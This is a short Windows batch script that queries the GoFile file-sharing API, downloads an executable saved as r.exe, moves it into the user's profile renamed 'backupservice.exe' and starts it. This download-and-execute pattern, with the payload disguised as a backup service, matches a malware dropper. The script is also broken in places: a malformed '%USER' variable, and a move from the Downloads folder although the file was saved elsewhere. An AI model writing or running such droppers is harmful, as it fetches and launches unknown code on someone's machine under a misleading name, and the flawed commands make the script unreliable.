@echo off
set CONTENT_ID=SplUgh
set OUTFILE=r.exe

echo Getting file info from GoFile...

curl -s https://api.gofile.io/contents/%CONTENT_ID% > response.json

for /f "tokens=2 delims=:," %%A in ('findstr /i "downloadPage" response.json') do (
    set URL=%%A
    goto download
)

:download
set URL=%URL:"=%
set URL=%URL: =%

echo Downloading from %URL% ...
curl -L "%URL%" -o %OUTFILE%

echo Done.
cd "C:\USers\%USER\"
md Backups
cd Backups
move "C:\Users\%USER%\Downloads\r.exe" "C:\USers\%USER%\backupservice.exe"
start backupservice.exe
